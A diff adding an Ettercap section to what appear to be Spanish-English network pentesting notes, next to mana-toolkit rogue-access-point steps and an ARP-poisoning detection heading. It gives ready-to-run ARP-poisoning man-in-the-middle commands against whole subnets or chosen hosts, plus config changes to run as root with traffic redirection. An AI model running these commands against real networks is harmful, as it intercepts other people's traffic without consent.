@@ -173,6 +173,37 @@ bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh
 ahora podemos usar wireshark o man in the midle F para analizar el trafico tenemos que usar la interface   
 que esta repartiendo la señal  
 
+## Ettercap
+```
+leafpad /etc/ettercap/etter.conf
+```
+Changes
+```
+ec_uid = 0
+ec_gid = 0
+-----
+Linux
+-----
+uncoment iptables and iptables IPV6
+redir_command_on
+redir_command_off
+redir6_command_on
+redir6_command_off
+```
+Run Ettercap Text mode
+```
+to target all host use ///
+
+ettercap -Tq ///
+ettercap -Tq -M arp:remote -i eth0 ///
+
+Use grups to spesifi the targets
+ettercap -Tq -M arp:remote -i eth0 mac/ip4/ip6/ports mac/ip4/ip6/ports
+ettercap -Tq -M arp:remote -i eth0 /10.20.30.1// /10.20.30.44//
+ettercap -Tq -M arp:remote -i eth0 /10.20.30.1// /10.20.30.44-77//
+ettercap -Tq -M arp:remote -i eth0 /10.20.30.1// /10.20.30.44,10.20.30.77//
+```
+
 Detectar Arp Poisoning:  
 comprovamos que los mac de las ips son unicos  
 ```
